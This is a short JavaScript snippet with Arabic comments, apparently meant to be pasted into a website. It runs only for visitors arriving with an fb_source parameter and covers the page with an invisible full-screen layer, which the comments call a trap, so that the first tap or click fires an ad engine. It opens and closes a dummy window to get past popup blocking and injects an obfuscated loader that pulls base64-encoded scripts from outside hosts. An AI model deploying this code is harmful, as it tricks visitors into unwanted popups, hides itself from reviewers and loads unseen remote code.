(function() {
    // 1. الفلترة: لا يعمل الكود إلا بوجود البراميتر fb_source
    const urlParams = new URLSearchParams(window.location.search);
    if (!urlParams.has("fb_source")) return;

    // 2. وظيفة التفعيل الخارقة
    function startAdEngine() {
        if (window._ad_active) return;
        window._is_human = true;

        // إيهام المتصفح بأننا نفتح نافذة شرعية
        const dummy = window.open('about:blank', '_blank');
        if (dummy) {
            // كود البوب الرسمي الخاص بك (Adsterra)
            (function(){var x=window,m="e23f9a20a32bcb0e16cc092ebc328951",z=[["siteId",260-829*134*841-342+97961243],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],s=["d3d3LmludGVsbGlwb3B1cC5jb20vVGxjL3hmbG93dHlwZS5taW4uanM=","ZDNtcjd5MTU0ZDJxZzUuY2xvdWRmcm9udC5uZXQvTnZGL1BNL2diYXRtYW4ubWluLmNzcw=="],c=-1,o,w,d=function(){clearTimeout(w);c++;if(s[c]&&!(1801238139000<(new Date).getTime()&&1<c)){o=x.document.createElement("script");o.type="text/javascript";o.async=!0;var r=x.document.getElementsByTagName("script")[0];o.src="https://"+atob(s[c]);o.crossOrigin="anonymous";o.onerror=d;o.onload=function(){clearTimeout(w);};w=setTimeout(d,5E3);r.parentNode.insertBefore(o,r)}};if(!x[m]){try{Object.freeze(x[m]=z)}catch(e){}d()}})();
            
            // إغلاق النافذة الوهمية فوراً لترك المجال لكود الشركة ليفتح نافذته الحقيقية
            setTimeout(() => { dummy.close(); }, 100);
            window._ad_active = true;
            window.focus();
        }
    }

    // 3. الفخ الشفاف (The Invisible Layer)
    // هذا الجزء يضمن أن أول "لمسة" للمستخدم على الشاشة تفعّل الكود فوراً
    window.onload = function() {
        const overlay = document.createElement('div');
        overlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;z-index:2147483647;background:transparent;cursor:pointer;";
        document.body.appendChild(overlay);

        const trigger = () => {
            startAdEngine();
            overlay.remove(); // تختفي الطبقة فوراً ليعود الموقع طبيعياً
        };

        // أحداث اللمس الحقيقية (التي يثق بها الموبايل)
        overlay.addEventListener('touchstart', trigger, { passive: true });
        overlay.addEventListener('mousedown', trigger, { once: true });
    };

})();
